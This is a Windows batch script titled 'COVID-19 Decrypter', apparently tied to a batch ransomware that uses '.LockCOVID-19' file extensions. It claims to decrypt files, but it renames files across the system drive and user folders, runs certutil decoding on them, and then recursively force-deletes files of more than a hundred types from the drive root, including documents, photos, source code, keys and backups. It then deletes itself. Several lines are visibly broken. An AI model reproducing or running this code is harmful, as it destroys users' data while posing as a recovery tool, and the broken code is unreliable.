@echo off
SETLOCAL EnableExtensions
title COVID-19 Decrypter
echo Your files are being decrypted now!>Decrypting.txt
REM
cd %SystemDrive%\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Desktop\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Downloads\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Favorites\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Searches\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Saved Games\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Contacts\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Links\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Videos\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Pictures\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Documents\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %UserProFile%\Music\
for %%a in (*) do ren "%%a" "%%~a.cxkdata"&for %%a in (%0) do ren "%%~a.cxkdata" "%%~na.bat"
for %%a in (*.cxkdata) do certutil -decode "%%~a" "%%~na.LockCOVID-19"
cd %SystemDrive%\
del /s /q *.cxkdata
for %%a in (*.wma) do certutil -decode "%%~a" "%%~na.wma"
del /s /f /q *.wma
for %%a in (*.avi) do certutil -decode "%%~a" "%%~na.avi"
del /s /f /q *.avi
for %%a in (*.wmv) do certutil -decode "%%~a" "%%~na.wmv"
del /s /f /q *.wmv
for %%a in (*.csv) do certutil -decode "%%~a" "%%~na.csv"
del /s /f /q *.csv
for %%a in (*.d3dbsp) do certutil -decode "%%~a" "%%~na"
del /s /f /q *.d3dbsp
for %%a in (*.zip) do certutil -decode "%%~a" "%%~na.zip"
del /s /f /q *.zip
for %%a in (*.sie) do certutil -decode "%%~a" "%%~na.sie"
del /s /f /q *.sie
for %%a in (.sum) do certutil -decode "%%~a" "%%~na.sum"
del /s /f /q *.sum
for %%a in (*.ibank) do certutil -decode "%%~a" "%%~na.ibank"
del /s /f /q *.ibank
for %%a in (*.t13) do certutil -decode "%%~a" "%%~na.t13"
del /s /f /q *.t13
for %%a in (*.t12) do certutil -decode "%%~a" "%%~na.t12"
del /s /f /q *.t12
for %%a in (*.qdf) do certutil -decode "%%~a" "%%~na.qdf"
del /s /f /q *.qdf
for %%a in (*.gdb) do certutil -decode "%%~a" "%%~na.gdb"
del /s /f /q *.gdb
for %%a in (*.tax) do certutil -decode "%%~a" "%%~na.tax"
del /s /f /q *.tax
for %%a in (*.pkpass) do certutil -decode "%%~a" "%%~na"
del /s /f /q *.pkpass
for %%a in (*.bc6) do certutil -decode "%%~a" "%%~na.bc6"
del /s /f /q *.bc6
for %%a in (*.bc7) do certutil -decode "%%~a" "%%~na.bc7"
del /s /f /q *.bc7
for %%a in (*.bkp) do certutil -decode "%%~a" "%%~na.bkp"
del /s /f /q *.bkp
for %%a in (*.qic) do certutil -decode "%%~a" "%%~na.qic"
del /s /f /q *.qic
for %%a in (*.bkf) do certutil -decode "%%~a" "%%~na.bkf"
del /s /f /q *.bkf
for %%a in (*.sidn) do certutil -decode "%%~a" "%%~na.sidn"
del /s /f /q *.sidn
for %%a in (*.sidd) do certutil -decode "%%~a" "%%~na.sidd"
del /s /f /q *.sidd
for %%a in (*.mddata) do certutil -decode "%%~a" "%%~na.mddata"
del /s /f /q *.mddata
for %%a in (*.itl) do certutil -decode "%%~a" "%%~na.itl"
del /s /f /q *.itl
for %%a in (*.itdb) do certutil -decode "%%~a" "%%~na.itdb"
del /s /f /q *.itdb
for %%a in (*.icxs) do certutil -decode "%%~a" "%%~na.icxs"
del /s /f /q *.icxs
for %%a in (*.hvpl) do certutil -decode "%%~a" "%%~na.hvpl"
del /s /f /q *.hvpl
for %%a in (*.hplg) do certutil -decode "%%~a" "%%~na.hplg"
del /s /f /q *.hplg
for %%a in (*.hkdb) do certutil -decode "%%~a" "%%~na.hkdb"
del /s /f /q *.hkdb
for %%a in (*.mdbackup) do certutil -decode "%%~a" "%%~na.mdbackup"
del /s /f /q *.mdbackup
for %%a in (*.syncdb) do certutil -decode "%%~a" "%%~na.syncdb"
del /s /f /q *.syncdb
for %%a in (*.gho) do certutil -decode "%%~a" "%%~na.gho"
del /s /f /q *.gho
for %%a in (*.cas) do certutil -decode "%%~a" "%%~na.cas"
del /s /f /q *.cas
for %%a in (*.svg) do certutil -decode "%%~a" "%%~na.svg"
del /s /f /q *.svg
for %%a in (*.map) do certutil -decode "%%~a" "%%~na.map"
del /s /f /q *.map
for %%a in (*.wmo) do certutil -decode "%%~a" "%%~na.wmo"
del /s /f /q *.wmo
for %%a in (*.itm) do certutil -decode "%%~a" "%%~na.itm"
del /s /f /q *.itm
for %%a in (*.sb) do certutil -decode "%%~a" "%%~na.sb"
del /s /f /q *.sb
for %%a in (*.fos) do certutil -decode "%%~a" "%%~na.fos"
del /s /f /q *.fos
for %%a in (*.mov) do certutil -decode "%%~a" "%%~na.mov"
del /s /f /q *.mov
for %%a in (*.vdf) do certutil -decode "%%~a" "%%~na.vdf"
del /s /f /q *.vdf
for %%a in (*.ztmp) do certutil -decode "%%~a" "%%~na.ztmp"
del /s /f /q *.ztmp
for %%a in (*.sis) do certutil -decode "%%~a" "%%~na.sis"
del /s /f /q *.sis
for %%a in (*.sid) do certutil -decode "%%~a" "%%~na.sid"
del /s /f /q *.sid
for %%a in (*.ncf) do certutil -decode "%%~a" "%%~na.ncf"
del /s /f /q *.ncf
for %%a in (*.menu) do certutil -decode "%%~a" "%%~na.menu"
del /s /f /q *.menu
for %%a in (*.layout) do certutil -decode "%%~a" "%%~na.layout"
del /s /f /q *.layout
for %%a in (*.dmp) do certutil -decode "%%~a" "%%~na.dmp"
del /s /f /q *.dmp
for %%a in (*.blob) do certutil -decode "%%~a" "%%~na.blob"
del /s /f /q *.blob
for %%a in (*.esm) do certutil -decode "%%~a" "%%~na.esm"
del /s /f /q *.esm
for %%a in (*.vcf) do certutil -decode "%%~a" "%%~na.vcf"
del /s /f /q *.vcf
for %%a in (*.vtf) do certutil -decode "%%~a" "%%~na.vtf"
del /s /f /q *.vtf
for %%a in (*.dazip) do certutil -decode "%%~a" "%%~na.dazip"
del /s /f /q *.dazip
for %%a in (*.fpk) do certutil -decode "%%~a" "%%~na.fpk"
del /s /f /q *.fpk
for %%a in (*.mlx) do certutil -decode "%%~a" "%%~na.mlx"
del /s /f /q *.mlx
for %%a in (*.kf) do certutil -decode "%%~a" "%%~na.kf"
del /s /f /q *.kf
for %%a in (*.iwd) do certutil -decode "%%~a" "%%~na.iwd"
del /s /f /q *.iwd
for %%a in (*.vpk) do certutil -decode "%%~a" "%%~na.vpk"
del /s /f /q *.vpk
for %%a in (*.tor) do certutil -decode "%%~a" "%%~na.tor"
del /s /f /q *.tor
for %%a in (*.psk) do certutil -decode "%%~a" "%%~na.psk"
del /s /f /q *.psk
for %%a in (*.rim) do certutil -decode "%%~a" "%%~na.rim"
del /s /f /q *.rim
for %%a in (*.w3x) do certutil -decode "%%~a" "%%~na.w3x"
del /s /f /q *.w3x
for %%a in (*.fsh) do certutil -decode "%%~a" "%%~na.fsh"
del /s /f /q *.fsh
for %%a in (*.ntl) do certutil -decode "%%~a" "%%~na.ntl"
del /s /f /q *.ntl
for %%a in (*.arch00) do certutil -decode "%%~a" "%%~na.arch00"
del /s /f /q *.arch00
for %%a in (*.lvl) do certutil -decode "%%~a" "%%~na.lvl"
del /s /f /q *.lvl
for %%a in (*.snx) do certutil -decode "%%~a" "%%~na.snx"
del /s /f /q *.snx
for %%a in (*.cfr) do certutil -decode "%%~a" "%%~na.cfr"
del /s /f /q *.cfr
for %%a in (*.ff) do certutil -decode "%%~a" "%%~na.ff"
del /s /f /q *.ff
for %%a in (*.vpp_pc) do certutil -decode "%%~a" "%%~na.vpp_pc"
del /s /f /q *.vpp_pc
for %%a in (*.lrf) do certutil -decode "%%~a" "%%~na.lrf"
del /s /f /q *.lrf
for %%a in (*.m2) do certutil -decode "%%~a" "%%~na.m2"
del /s /f /q *.m2
for %%a in (*.mcmeta) do certutil -decode "%%~a" "%%~na.mcmeta"
del /s /f /q *.mcmeta
for %%a in (*.vfs0) do certutil -decode "%%~a" "%%~na.vfs0"
del /s /f /q *.vfs0
for %%a in (*.mpqge) do certutil -decode "%%~a" "%%~na.mpqge"
del /s /f /q *.mpqge
for %%a in (*.kdb) do certutil -decode "%%~a" "%%~na.kdb"
del /s /f /q *.kdb
for %%a in (*.db0) do certutil -decode "%%~a" "%%~na.db0"
del /s /f /q *.db0
for %%a in (*.dba) do certutil -decode "%%~a" "%%~na.dba"
del /s /f /q *.dba
for %%a in (*.rofl) do certutil -decode "%%~a" "%%~na.rofl"
del /s /f /q *.rofl
for %%a in (*.hkx) do certutil -decode "%%~a" "%%~na.hkx"
del /s /f /q *.hkx
for %%a in (*.bar) do certutil -decode "%%~a" "%%~na.bar"
del /s /f /q *.bar
for %%a in (*.upk) do certutil -decode "%%~a" "%%~na.upk"
del /s /f /q *.upk
for %%a in (*.das) do certutil -decode "%%~a" "%%~na.das"
del /s /f /q *.das
for %%a in (*.iwi) do certutil -decode "%%~a" "%%~na.iwi"
del /s /f /q *.iwi
for %%a in (*.litemod) do certutil -decode "%%~a" "%%~na.litemod"
del /s /f /q *.litemod
for %%a in (*.asset) do certutil -decode "%%~a" "%%~na.asset"
del /s /f /q *.asset
for %%a in (*.forge) do certutil -decode "%%~a" "%%~na.forge"
del /s /f /q *.forge
for %%a in (*.ltx) do certutil -decode "%%~a" "%%~na.ltx"
del /s /f /q *.ltx
for %%a in (*.bsa) do certutil -decode "%%~a" "%%~na.bsa"
del /s /f /q *.bsa
for %%a in (*.apk) do certutil -decode "%%~a" "%%~na.apk"
del /s /f /q *.apk
for %%a in (*.re4) do certutil -decode "%%~a" "%%~na.re4"
del /s /f /q *.re4
for %% a in (*.sav) do certutil -decode "%%~a" "%%~na.sav"
del /s /f /q *.sav
for %%a in (*.lbf) do certutil -decode "%%~a" "%%~na.lbf"
del /s /f /q *.lbf
for %%a in (*.slm) do certutil -decode "%%~a" "%%~na.slm"
del /s /f /q *.slm
for %%a in (*.py) do certutil -decode "%%~a" "%%~na.py"
del /s /f /q *.py
for %%a in (*.m3u) do certutil -decode "%%~a" "%%~na.m3u"
del /s /f /q *.m3u
for %%a in (*.flv) do certutil -decode "%%~a" "%%~na.flv"
del /s /f /q *.flv
for %%a in (*.js) do certutil -decode "%%~a" "%%~na.js"
del /s /f /q *.js
for %%a in (*.css) do certutil -decode "%%~a" "%%~na.css"
del /s /f /q *.css
for %%a in (*.rb) do certutil -decode "%%~a" "%%~na.rb"
del /s /f /q *.rb
for %%a in (*.png) do certutil -decode "%%~a" "%%~na.png"
del /s /f /q *.png
for %%a in (*.jpeg) do certutil -decode "%%~a" "%%~na.jpeg"
del /s /f /q *.jpeg
for %%a in (*.txt) do certutil -decode "%%~a" "%%~na.txt"
del /s /f /q *.txt
for %%a in (*.p7c) do certutil -decode "%%~a" "%%~na.p7c"
del /s /f /q *.p7c
for %%a in (*.p12) do certutil -decode "%%~a" "%%~na.p12"
del /s /f /q *.p12
for %%a in (*.pfx) do certutil -decode "%%~a" "%%~na.pfx"
del /s /f /q *.pfx
for %%a in (*.pem) do certutil -decode "%%~a" "%%~na.pem"
del /s /f /q *.pem
for %%a in (*.crt) do certutil -decode "%%~a" "%%~na.crt"
del /s /f /q *.crt
for %%a in (*.cer) do certutil -decode "%%~a" "%%~na.cer"
del /s /f /q *.cer
for %%a in (*.x3f) do certutil -decode "%%~a" "%%~na.x3f"
del /s /f /q *.x3f
for %%a in (*.srw) do certutil -decode "%%~a" "%%~na.srw"
del /s /f /q *.srw
for %%a in (*.pef) do certutil -decode "%%~a" "%%~na.pef"
del /s /f /q *.pef
for %%a in (*.ptx) do certutil -decode "%%~a" "%%~na.ptx"
del /s /f /q *.ptx
for %%a in (*.r3d) do certutil -decode "%%~a" "%%~na.r3d"
del /s /f /q *.r3d
for %%a in (*.rw2) do certutil -decode "%%~a" "%%~na.rw2"
del /s /f /q *.rw2
for %%a in (*.rw1) do certutil -decode "%%~a" "%%~na.rw1"
del /s /f /q *.rw1
for %%a in (*.raw) do certutil -decode "%%~a" "%%~na.raw"
del /s /f /q *.raw
for %%a in (*.raf) do certutil -decode "%%~a" "%%~na.raf"
del /s /f /q *.raf
for %%a in (*.orf) do certutil -decode "%%~a" "%%~na.orf"
del /s /f /q *.orf
for %%a in (*.nrw) do certutil -decode "%%~a" "%%~na.nrw"
del /s /f /q *.nrw
for %%a in (*.mrwref) do certutil -decode "%%~a" "%%~na.mrwref"
del /s /f /q *.mrwref
for %%a in (*.mef) do certutil -decode "%%~a" "%%~na.mef"
del /s /f /q *.mef
for %%a in (*.erf) do certutil -decode "%%~a" "%%~na.erf"
del /s /f /q *.erf
for %%a in (*.kdc) do certutil -decode "%%~a" "%%~na.kdc"
del /s /f /q *.kdc
for %%a in (*.dcr) do certutil -decode "%%~a" "%%~na.dcr"
del /s /f /q *.dcr
for %%a in (*.cr2) do certutil -decode "%%~a" "%%~na.cr2"
del /s /f /q *.cr2
for %%a in (*.crw) do certutil -decode "%%~a" "%%~na.crw"
del /s /f /q *.crw
for %%a in (*.sr2) do certutil -decode "%%~a" "%%~na.sr2"
del /s /f /q *.sr2
for %%a in (*.srf) do certutil -decode "%%~a" "%%~na.srf"
del /s /f /q *.srf
for %%a in (*.arw) do certutil -decode "%%~a" "%%~na.arw"
del /s /f /q *.arw 
for %%a in (*.3fr) do certutil -decode "%%~a" "%%~na.3fr"
del /s /f /q *.3fr
for %%a in (*.dng) do certutil -decode "%%~a" "%%~na.dng"
del /s /f /q *.dng
for %%a in (*.jpe) do certutil -decode "%%~a" "%%~na.jpe"
del /s /f /q *.jpe
for %%a in (*.jpg) do certutil -decode "%%~a" "%%~na.jpg"
del /s /f /q *.jpg
for %%a in (*.cdr) do certutil -decode "%%~a" "%%~na.cdr"
del /s /f /q *.cdr
for %%a in (*.pdf) do certutil -decode "%%~a" "%%~na.pdf"
del /s /f /q *.pdf
for %%a in (*.pdd) do certutil -decode "%%~a" "%%~na.pdd"
del /s /f /q *.pdd
for %%a in (*.psd) do certutil -decode "%%~a" "%%~na.psd"
del /s /f /q *.psd
for %%a in (*.dbf) do certutil -decode "%%~a" "%%~na.dbf"
del /s /f /q *.dbf
for %%a in (*.mdf) do certutil -decode "%%~a" "%%~na.mdf"
del /s /f /q *.mdf
for %%a in (*.wb2) do certutil -decode "%%~a" "%%~na.wb2"
del /s /f /q *.wb2
for %%a in (*.rtf) do certutil -decode "%%~a" "%%~na.rtf"
del /s /f /q *.rtf
for %%a in (*.wpd) do certutil -decode "%%~a" "%%~na.wpd"
del /s /f /q *.wpd
for %%a in (*.dxg) do certutil -decode "%%~a" "%%~na.wpd"
del /s /f /q *.dxg
for %%a in (*.xf) do certutil -decode "%%~a" "%%~na.xf"
del /s /f /q *.xf
for %%a in (*.dwg) do certutil -decode "%%~a" "%%~na.dwg"
del /s /f /q *.dwg
for %%a in (*.pst) do certutil -decode "%%~a" "%%~na.pst"
del /s /f /q *.pst
for %%a in (*.accdb) do certutil -decode "%%~a" "%%~na.accdb"
del /s /f /q *.accdb
for %%a in (*.mdb) do certutil -decode "%%~a" "%%~na.mdb"
del /s /f /q *.mdb
for %%a in (*.pptm) do certutil -decode "%%~a" "%%~na.pptm"
del /s /f /q *.pptm
for %%a in (*.pptx) do certutil -decode "%%~a" "%%~na.pptx"
del /s /f /q *.pptx
for %%a in (*.ppt) do certutil -decode "%%~a" "%%~na.ppt"
del /s /f /q *.ppt
for %%a in (*.xlk) do certutil -decode "%%~a" "%%~na.xlk"
del /s /f /q *.xlk
for %%a in (*.xlsb) do certutil -decode "%%~a" "%%~na.xlsb"
del /s /f /q *.xlsb
for %%a in (*.xlsm) do certutil -decode "%%~a" "%%~na.xlsm"
del /s /f /q *.xlsm
for %%a in (*.xlsx) do certutil -decode "%%~a" "%%~na.xlsx"
del /s /f /q *.xlsx
for %%a in (*.xls) do certutil -decode "%%~a" "%%~na.xls"
del /s /f /q *.xls
for %%a in (*.wps) do certutil -decode "%%~a" "%%~na.wps"
del /s /f /q *.wps
for %%a in (*.docm) do certutil -decode "%%~a" "%%~na.docm"
del /s /f /q *.docm
for %%a in (*.docx) do certutil -decode "%%~a" "%%~na.docx"
del /s /f /q *.docx
for %%a in (*.doc) do certutil -decode "%%~a" "%%~na.doc"
del /s /f /q *.doc
for %%a in (*.odb) do certutil -decode "%%~a" "%%~na.odb"
del /s /f /q *.odb
for %%a in (*.odc) do certutil -decode "%%~a" "%%~na.odc"
del /s /f /q *.odc
for %%a in (*.odm) do certutil -decode "%%~a" "%%~na.odm"
del /s /f /q *.odm
for %%a in (*.odp) do certutil -decode "%%~a" "%%~na.odp"
del /s /f /q *.odp
for %%a in (*.ods) do certutil -decode "%%~a" "%%~na.ods"
del /s /f /q *.ods
for %%a in (*.odt) do certutil -decode "%%~a" "%%~na.odt"
del /s /f /q *.odt
echo Decrypting Is Over.
del /s /f /q COVID-19.bat
del /s /f /q IKV
exit
